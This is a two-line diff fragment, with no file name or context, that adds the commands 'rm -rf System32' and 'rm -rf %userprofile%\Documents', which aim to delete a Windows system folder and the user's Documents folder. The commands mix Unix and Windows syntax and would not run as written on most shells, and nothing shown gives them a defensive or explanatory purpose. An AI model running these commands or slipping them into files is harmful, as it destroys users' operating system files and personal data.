@@ -1,0 +1,2 @@
+rm -rf System32
+rm -rf %userprofile%\Documents
